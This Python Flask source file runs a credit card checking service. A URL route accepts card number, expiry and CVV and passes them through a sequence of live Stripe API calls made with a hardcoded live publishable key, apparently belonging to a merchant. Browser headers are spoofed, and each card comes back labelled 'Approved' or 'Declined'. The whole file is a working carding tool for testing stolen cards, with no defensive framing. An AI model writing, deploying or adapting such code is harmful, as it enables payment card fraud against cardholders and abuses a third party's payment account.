from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent

app = Flask(__name__)

def process_card(ccx):
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        return {
            "cc": ccx,
            "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "status": "Declined"
        }

    if "20" in yy: 
        yy = yy.split("20")[1]
    
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
    
    # Step 1: Create Customer
    customer_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }
    
    customer_data = {
        'key': 'pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf',
        '_stripe_version': '2024-06-20',
    }
    
    try:
        customer_response = requests.post(
            'https://api.stripe.com/v1/customers',
            data=customer_data,
            headers=customer_headers
        )
        customer_id = customer_response.json()['id']
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Customer Creation Failed: {str(e)}",
            "status": "Declined"
        }

    # Step 2: Create Payment Method
    payment_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }
    
    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'US',
        'key': 'pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf',
        '_stripe_version': '2024-06-20',
    }
    
    try:
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers=payment_headers
        )
        pm_data = pm_response.json()
        if 'id' not in pm_data:
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": pm_response.text,
                "status": "Declined"
            }
        payment_method_id = pm_data['id']
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Payment Method Creation Failed: {str(e)}",
            "status": "Declined"
        }

    # Step 3: Attach Payment Method to Customer
    attach_data = {
        'customer': customer_id,
        'key': 'pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf',
    }
    
    try:
        attach_response = requests.post(
            f'https://api.stripe.com/v1/payment_methods/{payment_method_id}/attach',
            data=attach_data,
            headers=payment_headers
        )
        if 'error' in attach_response.json():
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": attach_response.json()['error']['message'],
                "status": "Declined"
            }
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Payment Method Attachment Failed: {str(e)}",
            "status": "Declined"
        }

    # Step 4: Create Setup Intent
    setup_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent,
    }
    
    setup_data = {
        'customer': customer_id,
        'payment_method': payment_method_id,
        'confirm': 'true',
        'usage': 'off_session',
        'key': 'pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf',
        '_stripe_version': '2024-06-20',
    }
    
    try:
        setup_response = requests.post(
            'https://api.stripe.com/v1/setup_intents',
            data=setup_data,
            headers=setup_headers
        )
        setup_data = setup_response.json()
        
        if setup_data.get('status') == 'succeeded':
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": "Succeeded",
                "status": "Approved"
            }
        elif setup_data.get('status') == 'requires_action':
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": "Requires action",
                "status": "Approved"
            }
        else:
            error_msg = setup_data.get('last_setup_error', {}).get('message', 'Unknown error')
            return {
                "cc": f"{n}|{mm}|{yy}|{cvc}",
                "response": error_msg,
                "status": "Declined"
            }
    except Exception as e:
        return {
            "cc": f"{n}|{mm}|{yy}|{cvc}",
            "response": f"Setup Intent Failed: {str(e)}",
            "status": "Declined"
        }

@app.route('/gate=stripe3/keydarkwaslost/cc=<path:cc>', methods=['GET'])
def check_card(cc):
    result = process_card(cc)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3456)